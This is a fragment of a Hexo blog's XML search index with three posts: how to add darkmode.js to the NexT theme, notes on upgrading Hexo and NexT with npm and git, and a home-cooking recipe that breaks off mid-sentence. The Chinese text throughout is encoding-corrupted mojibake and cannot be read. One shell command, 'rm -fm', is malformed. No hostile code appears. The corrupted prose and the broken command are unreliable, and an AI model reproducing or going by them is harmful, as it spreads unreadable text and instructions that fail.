fa-external-link-alt"></i></span>ÊàêÂäüÈõÜÊàê‰∫Üdarkmode.js„ÄÇ</p><p>‰∫éÊòØÂè¶‰∏Ä‰ΩçÁΩëÂèãÂêëÂ§ß‰Ω¨YËØ¢ÈóÆÂ¶Ç‰ΩïÈõÜÊàêÁöÑÂÖ∑‰ΩìÁªÜËäÇÔºå‰ΩÜÊòØÊ≤°ÊúâÂæóÂà∞ÂõûÂ∫î„ÄÇ</p><p>Êó¢ÁÑ∂ÂèØË°åÔºåÈÇ£Â∞±‰∏çÂ¶®Â∞ùËØï‰∏Ä‰∏ãÔºåÊàë‰πüÊåâÁÖß<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NhbmRvY2hlL0Rhcmttb2RlLmpz">darkmode.jsÂÆòÊñπÁöÑËØ¥Êòé<i class="fa fa-external-link-alt"></i></span>Êìç‰Ωú‰∏ÄÁï™ÔºåÂÖ∂‰∏≠‰πüÈÅáÂà∞‰∫Ü‰∫õÂ∞èÈóÆÈ¢òÔºö</p><ul><li>ÂàáÊç¢ÊåâÈíÆÊó†Ê≥ïÁÇπÂáª</li><li>ÂàáÊç¢Âà∞Â§úÈó¥Ê®°ÂºèÂêéÔºåÊâÄÊúâÂõæÁâáÁöÑÈ¢úËâ≤‰πüË¢´ÁøªËΩ¨ÔºåËøô‰∏çÊòØÊàë‰ª¨ÊâÄÊúüÊúõÁöÑ</li></ul><p>‰∏∫Ëß£ÂÜ≥Ëøô‰∫õÈóÆÈ¢òÔºåÂèÇËÄÉ‰∫Ü<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NhbmRvY2hlL0Rhcmttb2RlLmpzL2lzc3Vlcy80">ÂÆòÊñπÁõ∏ÂÖ≥issue<i class="fa fa-external-link-alt"></i></span>ÔºåÂπ∂‰∏îÊäÑ‰∫Ü<span class="exturl" data-url="aHR0cHM6Ly95dXpob3V3YW4uY29tLw==">Â§ß‰Ω¨YÁöÑ‰Ωú‰∏ö<i class="fa fa-external-link-alt"></i></span>„ÄÇ</p><h2 id="‰∏∫nextËÆ¢Âà∂darkmode.js">‰∏∫NextËÆ¢Âà∂darkmode.js</h2><p>ÂèØ‰ª•ÂèÇËÄÉËøôÈáåÊàëforkÁöÑnextÂØπÊØîÂÖ∑‰ΩìÂÅö‰∫ÜÂì™‰∫õÈÖçÁΩÆÂíå‰øÆÊîπÔºö<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RvZy0yL2hleG8tdGhlbWUtbmV4dA==">dog-2/hexo-theme-next<i class="fa fa-external-link-alt"></i></span></p><p>ÊúÄÁªàÊïàÊûúÂõæËßÅÊñáÁ´†ÊúÄÂêéÔºå‰∏ãÈù¢ÊòØÂÖ∑‰ΩìÊ≠•È™§Ôºö</p><h3 id="Â∞Üdarkmode.jsÊ∑ªÂä†‰∏∫nextÁöÑsubmodule">1. Â∞Üdarkmode.jsÊ∑ªÂä†‰∏∫NextÁöÑsubmodule</h3><p>.gitignore ÊúÄÂêéÊ∑ªÂä† <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!<span class="built_in">source</span>/lib/darkmode-js</span><br></pre></td></tr></table></figure></p><p>ËøõÂÖ• <code>{blog_dir}/themes/next/</code>ÔºåÊâßË°åÂ¶Ç‰∏ãÂëΩ‰ª§ <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git submodule add https://github.com/sandoche/Darkmode.js.git <span class="built_in">source</span>/lib/darkmode-js/</span><br></pre></td></tr></table></figure></p><h3 id="Ê†πÊçÆÂÅèÂ•Ω‰øÆÊîπÈÖçÁΩÆÊñá‰ª∂">2. Ê†πÊçÆÂÅèÂ•Ω‰øÆÊîπÈÖçÁΩÆÊñá‰ª∂</h3><p>Ê†πÊçÆÂÅèÂ•Ω‰øÆÊîπ‰∏ãÂàóÈÖçÁΩÆÊñá‰ª∂‰∏≠ÁöÑÂÖ∂ÂÆÉÈÄâÈ°π</p><ul><li>{blog_dir}/themes/next/languages/en.yml</li><li>nextÈÖçÁΩÆÊñá‰ª∂‰∏≠ÁöÑÈÖçÁΩÆ</li></ul><div class="note warning"><p>ËøôÈáåÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØnextÊúâ‰∏§ÁßçÈÖçÁΩÆÊñá‰ª∂ÁöÑÂΩ¢ÂºèÔºåËØ∑Á°ÆËÆ§Ëá™Â∑±ÊòØÂì™‰∏ÄÁßç„ÄÇ Êñ∞NextÁöÑÈÖçÁΩÆÊñá‰ª∂ÔºåÊúâ2ÁßçËÆæÁΩÆÊñπÂºèÔºåËØ∑ÂèÇËÄÉÂÆòÊñπÊñáÊ°£Ôºö</p><ul><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZW1lLW5leHQvaGV4by10aGVtZS1uZXh0L2Jsb2IvbWFzdGVyL2RvY3MvemgtQ04vREFUQS1GSUxFUy5tZA==">ÂÆòÊñπ‰∏≠Êñá<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0Lm9yZy9kb2NzL2dldHRpbmctc3RhcnRlZC9jb25maWd1cmF0aW9u">ÂÆòÊñπËã±Êñá<i class="fa fa-external-link-alt"></i></span></li></ul></div><h3 id="ÂÆöÂà∂vendorsÂä†ÂÖ•darkmode.js">3. ÂÆöÂà∂vendorsÂä†ÂÖ•darkmode.js</h3><ol type="1"><li>‰øÆÊîπ <code>{blog_dir}/themes/next/layout/_scripts/vendors.swig</code></li><li>‰øÆÊîπnextÈÖçÁΩÆÊñá‰ª∂‰∏≠ÁöÑÈíàÂØπdarkmode‰ª•Âèädarkmode-jsÁöÑÈÖçÁΩÆÔºö<ul><li>Á°Æ‰øùnextÂéüÊúâ<code>darkmode</code>ÈÄâÈ°πËÆæÁΩÆ‰∏∫ <code>false</code></li><li>Ê∑ªÂä†darkmode-jsÂºÄÂÖ≥</li><li>Ê∑ªÂä†darkmode-jsËá™ÂÆö‰πâCDNÈÄâÈ°πÔºàÂèØÈÄâÔºâ</li></ul></li></ol><h1 id="ÊúÄÁªàÊïàÊûú">ÊúÄÁªàÊïàÊûú</h1><img src="/tech/hexo-dark-mode-note/1.gif" class="" title="darkmode.jsÊïàÊûú">]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blog </tag>
            
            <tag> Hexo </tag>
            
            <tag> Hexo Next </tag>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo &amp; Next ÂçáÁ∫ßÁ¨îËÆ∞</title>
      <link href="/tech/hexo-next-upgrade-note/"/>
      <url>/tech/hexo-next-upgrade-note/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Hexo &amp; Next Upgrade Note</strong></em></li><li>Author: dog2</li></ul><hr /><p>Âá†Âπ¥Ê≤°ÊúâÁ¢∞BlogÔºåÊúÄËøëÊâìÁÆóÈáçÊñ∞ÂºÄÂßãÂÜôÔºåÂõ†Ê≠§ÈúÄË¶ÅÊõ¥Êñ∞hexo‰ª•ÂèäNext‰∏ªÈ¢ò„ÄÇ</p><p>Áî±‰∫é‰∏çÊÄé‰πàÊáÇÂâçÁ´ØÔºå‰∏çÂá∫ÊÑèÂ§ñÊÑèÂ§ñÂú∞ÈÅáÂà∞‰∫Ü‰∏ÄÂ†ÜÂùëÔºåËøôÈáåËÆ∞ÂΩï‰∏Ä‰∏ãÔºö</p><h2 id="ÁõÆÁöÑ">ÁõÆÁöÑ</h2><ul><li>node: <code>v6.17.1</code> =&gt; <code>v13.7.0</code></li><li>hexo: <code>v3.2.x</code> =&gt; <code>v4.2.0</code></li><li>next: <code>v4.x</code> =&gt; <code>v7.8.0</code></li></ul><h2 id="Êõ¥Êñ∞-node">Êõ¥Êñ∞ node</h2><p>ÊàëÁöÑÁ≥ªÁªü‰ΩøÁî®nvmÁÆ°ÁêÜÂ§öÁâàÊú¨nodeÔºåÈ¶ñÂÖàÊõ¥Êñ∞npmÔºö</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g npm</span><br></pre></td></tr></table></figure><p>Ê∏ÖÈô§npmÁºìÂ≠òÔºåÂèØËÉΩÈúÄË¶Å sudo</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm cache clean -f</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="Êõ¥Êñ∞-hexo">Êõ¥Êñ∞ hexo</h2><p>ËøõÂÖ•blogÁõÆÂΩïÔºåÊâßË°åÂ¶Ç‰∏ãÂëΩ‰ª§Ôºö</p><ul><li>Êõ¥Êñ∞package.json‰∏≠ÁöÑhexoÂèä‰∏™Êèí‰ª∂ÁâàÊú¨ <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install -g npm-check</span><br><span class="line">npm install -g npm-upgrade</span><br><span class="line">npm-check</span><br><span class="line">npm-upgrade</span><br></pre></td></tr></table></figure></li><li>Êõ¥Êñ∞hexoÂèäÊâÄÊúâÊèí‰ª∂ <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm update</span><br></pre></td></tr></table></figure></li><li>Á°ÆËÆ§hexoÁâàÊú¨Âè∑ÊòØÂê¶Â∑≤Êõ¥Êñ∞ <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo version</span><br></pre></td></tr></table></figure></li></ul><div class="note warning"><h3 id="ÊΩúÂú®ÈîôËØØ">ÊΩúÂú®ÈîôËØØ</h3>Ê≠§Êó∂ËøêË°å hexo generate ÂëΩ‰ª§ÔºåËã•Âá∫Áé∞‰∫ÜÂ¶Ç‰∏ãÈîôËØØÔºö<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">DTraceProviderBindings MODULE_NOT_FOUND;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>ÈÄöËøáÈáçÊñ∞ÂÆâË£Ö <code>hexo-cli</code> ÂèØ‰ª•Ëß£ÂÜ≥<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm uninstall hexo-cli -g</span><br><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure></div><h2 id="Êõ¥Êñ∞-next-‰∏ªÈ¢ò">Êõ¥Êñ∞ Next ‰∏ªÈ¢ò</h2><h3 id="Â§á‰ªΩÂèØÈÄâ">Â§á‰ªΩÔºàÂèØÈÄâÔºâ</h3><p>ÊàëÂ§á‰ªΩ‰∫ÜÂ¶Ç‰∏ãÊóßÈÖçÁΩÆÊñá‰ª∂Ôºö</p><ul><li><code>{blog_dir}/themes/next/_config.yml</code></li><li><code>{blog_dir}/themes/next/languages/en.yml</code></li><li><code>{blog_dir}/themes/next/languages/zh-Hans.yml</code></li><li><code>{blog_dir}/themes/next/source/404.yml</code></li></ul><p>ÂêéÊù•ÂèëÁé∞Êñ∞ÁâàNextÂèòÂåñÂ§™Â§ßÔºåÂæàÂ§öÈÖçÁΩÆÈ°πÂíåÊñπÂºèÈÉΩÂèò‰∫Ü„ÄÇ ‰ΩÜÊòØÊóßÊñá‰ª∂ÂèØ‰ª•‰Ωú‰∏∫ËøáÂéªÂñúÂ•ΩÁöÑÂèÇËÄÉ„ÄÇ</p><h3 id="Êõ¥Êñ∞-next">Êõ¥Êñ∞ Next</h3><p>ÊÉ≥Ë¶ÅÊõ¥Êñ∞NextÊó∂ÔºåÂèëÁé∞Â∑≤ÁªèÊúâ‰∫ÜÂ§©ÁøªÂú∞Ë¶ÜÁöÑÂèòÂåñÔºåËøûgithubÁöÑÈ°πÁõÆÁõÆÂΩïÈÉΩÂèò‰∫ÜÔºåËØ•È°πÁõÆÂ∑≤ÁªèÁ§æÂå∫ÂåñÔºö</p><ul><li>ÊóßÁõÆÂΩï <code>~ v5.x</code>Ôºö<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2lpc3NuYW4vaGV4by10aGVtZS1uZXh0">https://github.com/iissnan/hexo-theme-next<i class="fa fa-external-link-alt"></i></span></li><li><p>Êñ∞ÁõÆÂΩï <code>v6.x ~</code>Ôºö<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZW1lLW5leHQvaGV4by10aGVtZS1uZXh0">https://github.com/theme-next/hexo-theme-next<i class="fa fa-external-link-alt"></i></span></p></li><li>Âà†Èô§ÊóßÁöÑ next <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -fm themes/next</span><br></pre></td></tr></table></figure></li><li><p>ÂÖãÈöÜÊúÄÊñ∞ÁöÑ next <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/theme-next/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure></p></li></ul><h3 id="ÈÖçÁΩÆ-next">ÈÖçÁΩÆ Next</h3><p>‰ªéÂÆòÊñπÊñáÊ°£Ëé∑ÊÇâÔºåNextÁöÑÈÖçÁΩÆÂèò‰∫ÜÂæàÂ§ö„ÄÇ</p><p>ÂÖ∂ÂÆûÈ¶ñÂÖàËØ•Êèí‰∏ÄÂè•ÔºåÂÆòÁΩë‰πüÂèò‰∫Ü„ÄÇ„ÄÇ„ÄÇ</p><ul><li>ÊóßÂÆòÁΩëÔºö<span class="exturl" data-url="aHR0cHM6Ly9ub3Rlcy5paXNzbmFuLmNvbS8=">https://notes.iissnan.com/<i class="fa fa-external-link-alt"></i></span></li><li>Êñ∞ÂÆòÁΩëÔºö<span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0Lm9yZy8=">https://theme-next.org/<i class="fa fa-external-link-alt"></i></span></li></ul><p>Êñ∞NextÁöÑÈÖçÁΩÆÊñá‰ª∂ÔºåÊúâ2ÁßçËÆæÁΩÆÊñπÂºèÔºåËØ∑ÂèÇËÄÉÂÆòÊñπÊñáÊ°£Ôºö - <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RoZW1lLW5leHQvaGV4by10aGVtZS1uZXh0L2Jsb2IvbWFzdGVyL2RvY3MvemgtQ04vREFUQS1GSUxFUy5tZA==">ÂÆòÊñπ‰∏≠Êñá<i class="fa fa-external-link-alt"></i></span> - <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9kb2NzL2dldHRpbmctc3RhcnRlZC9jb25maWd1cmF0aW9u">ÂÆòÊñπËã±Êñá<i class="fa fa-external-link-alt"></i></span></p><p>ÊØè‰∏™‰∫∫ÁöÑÈÖçÁΩÆ‰∏çÂ∞ΩÁõ∏ÂêåÔºåÊàëÂè™ÊòØÁÆÄÂçïÁöÑÈÖçÁΩÆ‰∫Ü‰∏ÄÈÉ®ÂàÜÔºåËøôÈáåÁªôÂá∫Â§ß‰Ω¨‰ª¨ÁöÑÈùûÂ∏∏ÂÖ®Èù¢ÁöÑÈÖçÁΩÆ‰ª•‰æõÂèÇËÄÉ - <span class="exturl" data-url="aHR0cHM6Ly90ZGluZy50b3AvYXJjaGl2ZXMvNDJjMzhiMTAuaHRtbA==">Hexo-NexT (v7.0+) ‰∏ªÈ¢òÈÖçÁΩÆ<i class="fa fa-external-link-alt"></i></span> - <span class="exturl" data-url="aHR0cHM6Ly9zaXJpdXNxLnRvcC9OZXh0JUU0JUI4JUJCJUU5JUEyJTk4JUU3JUJFJThFJUU1JThDJTk2Lmh0bWw=">Next‰∏ªÈ¢òÁæéÂåñ(‰ªÖ7.1ÁâàÊú¨)<i class="fa fa-external-link-alt"></i></span></p><h3 id="ÂÆöÂà∂-next">ÂÆöÂà∂ Next</h3><h4 id="dark-mode-ÊöóËâ≤ËÉåÊôØÂ§úÈó¥Ê®°Âºè">Dark Mode ÊöóËâ≤ËÉåÊôØÔºàÂ§úÈó¥Ê®°ÂºèÔºâ</h4><p>ËøôÈÉ®ÂàÜÂÜÖÂÆπËæÉÂ§öÔºåÊàëÂçïÁã¨ÂÜôÂà∞‰∫ÜÂè¶‰∏ÄÁØáÊñáÁ´†Èáå <a href="/tech/hexo-dark-mode-note/">HexoÔºàNext‰∏ªÈ¢òÔºâDark Mode(ÊöóËâ≤ËÉåÊôØ/Â§úÈó¥Ê®°Âºè)ÊäòËÖæÁ¨îËÆ∞</a></p><h4 id="‰ª£Á†ÅÂùómac-panelÁâπÊïà">‰ª£Á†ÅÂùóMac PanelÁâπÊïà</h4><p>Ëøô‰∏™Â±û‰∫éÁæéÂåñÔºåÊàëÊ≤°ÊúâÂ∞ùËØïÔºåËØ∑ÂèÇËßÅ<span class="exturl" data-url="aHR0cHM6Ly9oYXNhaWsuY29tL3Bvc3RzL2Q3Mzk5ZTgwLmh0bWw=">Â§ß‰Ω¨ÁöÑËÆ¢Âà∂<i class="fa fa-external-link-alt"></i></span>„ÄÇ</p><h3 id="ÈÅóÁïôÈóÆÈ¢ò">ÈÅóÁïôÈóÆÈ¢ò</h3><ol type="1"><li>ÂΩìÂâçÁâàÊú¨ÁöÑNext Áõ∏ÂÖ≥ÊñáÁ´†Ôºà<code>hexo-related-popular-posts</code>Êèí‰ª∂Ôºâ<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RlYTMvaGV4by1yZWxhdGVkLXBvcHVsYXItcG9zdHMvaXNzdWVzLzIx">Êó†Ê≥ï‰ΩøÁî®<i class="fa fa-external-link-alt"></i></span>Ôºå‰∏çÁü•ÈÅìÊòØ‰∏çÊòØÊàëÁöÑÂßøÂäø‰∏çÂØπ</li></ol><h2 id="ÂèÇËÄÉÈìæÊé•">ÂèÇËÄÉÈìæÊé•</h2><ul><li><span class="exturl" data-url="aHR0cHM6Ly9zZWN1cml0eXRlY2guc2l0ZS96aC1DTi8zYmEzYmU5Lw==">HexoÁâàÊú¨ÂçáÁ∫ßÊåáÂçó<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9qdWVqaW4uaW0vZW50cnkvNWI5NjUxOTVlNTFkNDUwZTU1MTlkMmM0">HexoÁöÑDTraceProviderBindings MODULE_NOT_FOUNDÈóÆÈ¢ò<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9zZXZlbmNoby5naXRodWIuaW8vYXJjaGl2ZXMvMTQ1MzRiZWIuaHRtbA==">HexoÂçöÂÆ¢NexT‰∏ªÈ¢ò‰ªév5.x.xÊõ¥Êñ∞Âà∞v6.x.xÁöÑËÆ∞ÂΩïÂèäÊÄªÁªì<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9zaXJpdXNxLnRvcC9OZXh0JUU1JThEJTg3JUU3JUJBJUE3LU1hYyVFOCVCRiU4MSVFNyVBNyVCQi5odG1s">NextÂçáÁ∫ß+MacËøÅÁßª<i class="fa fa-external-link-alt"></i></span></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blog </tag>
            
            <tag> Hexo </tag>
            
            <tag> Hexo Next </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>‰∫åÂé®Á¨îËÆ∞ #2: ÊÖ¢ÁÇí‰∏â‰∏Å„ÄåËèúË∞±„Äç</title>
      <link href="/life/dog2s-cooking-notes-2/"/>
      <url>/life/dog2s-cooking-notes-2/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Dog2's Cooking Notes #2: Slowly Fried DingDingDing(Cookbook)</strong></em></li><li>Author: dog2</li></ul><hr /><h2 id="ÂâçË®Ä">ÂâçË®Ä</h2><p>Êú¨ËèúË∞±ÊòØÊ†πÊçÆ<span class="exturl" data-url="aHR0cDovL3d3dy54aWFjaHVmYW5nLmNvbS9y">„Äå‰∏ãÂé®Êàø„Äç<i class="fa fa-external-link-alt"></i></span>ËèúË∞±<span class="exturl" data-url="aHR0cDovL3d3dy54aWFjaHVmYW5nLmNvbS9yZWNpcGUvMTAwMjg3NTY2Lw==">„ÄåÊØõË±ÜËÇâ‰∏ÅÁÇíËåÑÂ≠ê„Äç<i class="fa fa-external-link-alt"></i></span> ÊîπËøõËÄåÊù•„ÄÇ</p><p>ÊîπËøõÂêéÁöÑËèúË∞±Âú®È£üÊùê‰∏≠ÂéªÊéâ‰∫ÜËåÑ‰∏ÅÔºåÁî®ËÉ°ËêùÂçú‰∏ÅÊõøÊç¢ÔºåÂõ†ËåÑ‰∏ÅÊåâÁÖßÂéüËèúË∞±ÁöÑÂ§ÑÁêÜÊñπÂºè‰ªçÊØîËæÉÂê∏ÁõêÔºå‰∏îÂéüËèúË∞±‰∏≠Â§ÑÁêÜËåÑ‰∏Å‰∏çÂÉèÁÉπÂà∂ËÇâÊú´ËåÑÂ≠êÈÇ£Ê†∑‰ºö‰ΩøÁî®ËøáÈáèÊ≤πÁÖéÈÄèÔºåËøô‰ºöÂØºËá¥ÊúÄÁªàÁÉπÂà∂ÁöÑËåÑ‰∏ÅÂ∏¶Êúâ‰∫õËÆ∏ÁîüËåÑÁâπÊúâÁöÑËÖ•Âë≥„ÄÇ</p><p>ÂêéÁª≠‰ΩêÊñô‰ª•ÂèäÁÉπÂà∂ÊñπÊ≥ï‰πüÊúâËæÉÂ§ßÊîπÂä®ÔºåÂÖ∑‰ΩìËßÅÊñ∞ËèúË∞±„ÄÇ</p><a id="more"></a><h2 id="ËÖåÂà∂Áò¶ËÇâ‰∏ù‰∏ÅÊú´">ËÖåÂà∂Áò¶ËÇâ(‰∏ù/‰∏Å/Êú´)</h2><p>Âú®‰ªãÁªçÊ≠£ÂºèËèúË∞±‰πãÂâçÔºåÊú¨ËäÇÂÖà‰ªãÁªç‰∏Ä‰∏ãÈÄöÁî®ÁöÑÁò¶ËÇâËÖåÂà∂ÊñπÊ≥ï„ÄÇ</p><p>‰∏çÂ∞ëÁªèÂÖ∏ËèúË∞±ÈÉΩÈúÄË¶Å‰ΩøÁî®Áò¶ËÇâÔºåÊØîÂ¶ÇÈùíÊ§íËÇâ‰∏ù„ÄÅËÇâÊú´ËåÑÂ≠êÁ≠âÔºåÂú®ÁÇíÂà∂ÂâçÂØπÁò¶ËÇâËøõË°åËÖåÂà∂ÊòØ‰∏ÄÈÅìÂøÖ‰∏çÂèØÂ∞ëÁöÑÂ∑•Â∫èÔºåËÖåÂà∂ÂÖ∂ÂÆûÂ∞±ÊòØÂä†ÂÖ•‰ΩêÊñôÊãåÂåÄÈùôÁΩÆÁâáÂàªÁöÑÁÆÄÂçïËøáÁ®ãÔºå‰ΩÜ‰∏çÂêåËèúË∞±‰∏≠ÁöÑËÖåÂà∂‰ΩêÊñô‰∏çÂ∞ΩÁõ∏Âêå„ÄÇÂõ†Ê≠§ËøôÈáå‰ªãÁªç‰∏Ä‰∏ã‰∏™‰∫∫ËÆ§‰∏∫Âë≥ÈÅìËæÉÂ•ΩÁöÑËÖåÂà∂ÊñπÂºè„ÄÇ</p><p>ËØ•ÊñπÊ≥ïÊ≠£ÊòØ‰ªé‰∏äËäÇ‰∏≠ÁöÑÂéüËèúË∞±‰∏≠‰π†ÂæóÔºå‰πüÂèØËøêÁî®Âà∞ÂÖ∂‰ªñÈúÄËÖåÂà∂Áò¶ËÇâÁöÑËèúË∞±‰∏≠ÔºåÂ±û‰∫é‰∏ÄÁßçËæÉÂ•ΩÁöÑÈÄöÁî®ÂßøÂäø„ÄÇ</p><p><strong>ËÖåÂà∂ÊñπÊ≥ï‰∏∫ÔºöÂä†ÂÖ•ÁîüÊäΩ„ÄÅÈªÑÈÖíÔºàÊñôÈÖíÔºâ„ÄÅÈ¶ôÊ≤πÔºàËäùÈ∫ªÊ≤πÔºâ„ÄÅËÉ°Ê§íÁ≤â„ÄÅÊ∑ÄÁ≤âÔºàÂ´©ËÇâÁ≤âÔºâÔºåÊãåÂåÄÂπ∂ÈùôÁΩÆ10ÂàÜÈíü‰ª•‰∏ä„ÄÇ</strong></p><p>ÂæàÂ§öËèúË∞±‰∏≠‰ªãÁªçÁöÑËÖåÂà∂ËøáÁ®ãÊòØÈúÄË¶ÅÂä†ÂÖ•ÁõêÁöÑÔºå‰ΩÜÊòØÁªèËøá‰∏ÄÊÆµÊó∂Èó¥ÂÆûË∑µÊàëÂèëÁé∞ËøôÊòØ‰∏çÈúÄË¶Å‰∏îÊúÄÂ•Ω‰∏çË¶ÅÁöÑÔºåÂõ†‰∏∫Ê≠£Â¶Ç‰∏ä‰∏ÄÁØáÊñáÁ´†„ÄåÈ£üÊùêÂê∏ÁõêÂ∫¶Â∞èÁªì„Äç‰∏≠‰ªãÁªçÔºåÁò¶ËÇâÂ±û‰∫éËæÉÂÆπÊòìÂê∏ÁõêÁöÑÈ£üÊùêÔºåËã•ËÖåÂà∂Êó∂Âä†ÂÖ•ÁõêÔºåÂêéÁª≠Âú®ÁÇíÂà∂ËøáÁ®ã‰∏≠Ëøò‰ºöÂÜçÂê∏ÁõêÔºåÊúÄÁªàÂèØËÉΩÂØºËá¥ÁÇíÂá∫ÁöÑËèúÂîØÁã¨Áò¶ËÇâËøáÂí∏ËÄåÂØºËá¥Êï¥ÈÅìËèúÁöÑÂè£ÊÑü‰∏çÂπ≥Ë°°„ÄÇ</p><p>‰∏∫‰∫Ü‰æø‰∫éËøõ‰∏ÄÊ≠•‰Ωì‰ºöÔºåËøôÈáåÁî®ÈùíÊ§íÔºàÊú®ËÄ≥ÔºâËÇâ‰∏ùÁöÑÁÇíÂà∂ËøáÁ®ã‰Ωú‰∏∫Á§∫‰æãÔºö</p><ol type="1"><li>ËÖåÂà∂ÂÆåÁöÑÁò¶ËÇâËøáÊ≤πÂêéÁõõËµ∑Â§áÁî®„ÄÇ</li><li>Â∞ëÈáèÊ≤πÂÖ•ÈîÖÔºåÁàÜÈ¶ôËë±ÂßúËíúÊú´„ÄÇ</li><li>ÈùíÊ§í‰∏ù„ÄÅÊú®ËÄ≥ÂÖ•ÈîÖÔºåÂä†ÂÖ•ÈÄÇÈáèÁîüÊäΩ„ÄÅÊñôÈÖí„ÄÅÈ¶ôÊ≤π„ÄÅÁ≥ñ‰ª•Âèä‰∏âÂàÜ‰πã‰∫åÁöÑÁõêÔºåÁÇíËá≥Âä†ÂÖ•Ê∂≤‰ΩìÊå•ÂèëÊÆÜÂ∞Ω„ÄÇ</li><li>Áò¶ËÇâÂÖ•ÈîÖÔºåÂä†ÂÖ•‰∏âÂàÜ‰πã‰∏ÄÁöÑÁõêÂèäÂ∞ëÈáèÊ∞¥ÔºåÁøªÁÇíËá≥Ê∞¥Êå•ÂèëÊÆÜÂ∞ΩÂêéÂÆåÊàê„ÄÇ</li></ol><p>Â¶Ç‰∏äËøáÁ®ãÊúâÂ¶Ç‰∏ãÂá†ÁÇπÈúÄË¶ÅÊ≥®ÊÑèÔºö</p><ul><li>ËøôÈáåËØ¥ÂêÑÁßç‰ΩêÊñôÂä†ÂÖ•ÈÄÇÈáèËÄåÊ≤°ÊúâÂÖ∑‰ΩìÊï∞ÈáèÂÄºÔºåÊòØÁî±‰∫éÈÄÇÈáèÁöÑÂÄºÁ°ÆÂÆûÈúÄË¶ÅÈÄöËøá‰∏çÊñ≠ÂÆûË∑µÁßØÁ¥ØÁªèÈ™åÊâçËÉΩ‰Ωì‰ºöÂà∞Ôºå‰πüÂ∞±ÊòØ‚ÄúÂá≠ÊÑüËßâ‚Äù=.=ÔºåÊúâ‰∏ÄÂÆöÁªèÈ™åÂêéËøòÈúÄÊ†πÊçÆÂΩìÊ¨°ÁÉπÂà∂Êó∂È£üÊùêÁöÑÈáèÊù•ÊùÉË°°‰ΩêÊñôÁöÑÈáè„ÄÇ</li><li>ËøôÈáåÊâÄËØ¥ÁöÑÁõêÁöÑÈáèÔºåÊòØÂÅáËÆæÁÇíËá≥ËøôÈÅìËèúÊâÄÈúÄÁöÑÁõêÁöÑÊÄªÈáè‰∏∫1ÔºåÂàôÂú®ÁÇíËá≥ÈùíÊ§íÂíåÊú®ËÄ≥Êó∂ÊîæÂÖ•ÊÄªÈáèÁöÑ‰∏âÂàÜ‰πã‰∫åÔºåÂä†ÂÖ•Áò¶ËÇâÂêéÂÜçÊîæÂÖ•Ââ©‰∏ã‰∏âÂàÜ‰πã‰∏Ä„ÄÇËá≥‰∫éÂÆûÈôÖÈúÄÁõêÁöÑÈáèÔºå‰ªçÈúÄÊ†πÊçÆÁªèÈ™åÂà§Êñ≠„ÄÇ</li><li>‰πãÊâÄ‰ª•ÂÖàÂä†ÂÖ•‰∏âÂàÜ‰πã‰∫åÁöÑÁõêÔºåÊòØÁî±‰∫éÈùíÊ§íÂíåÊú®ËÄ≥ÁöÑÂê∏ÁõêÂ∫¶Áõ∏ËøëÔºå‰∏îËøú‰∏çÂ¶ÇÁò¶ËÇâÔºåÂõ†Ê≠§‰∏∫‰∫ÜÂπ≥Ë°°ÊúÄÁªà‰∏çÂêåÈ£üÊùêÁöÑÂí∏Â∫¶ÔºåÈúÄË¶ÅÂÖàÊîæÂÖ•Â§ßÈÉ®ÂàÜÁöÑÁõêÁÇíÂà∂ÁâáÂàªÔºå‰ΩøÈÉ®ÂàÜÁõêË¢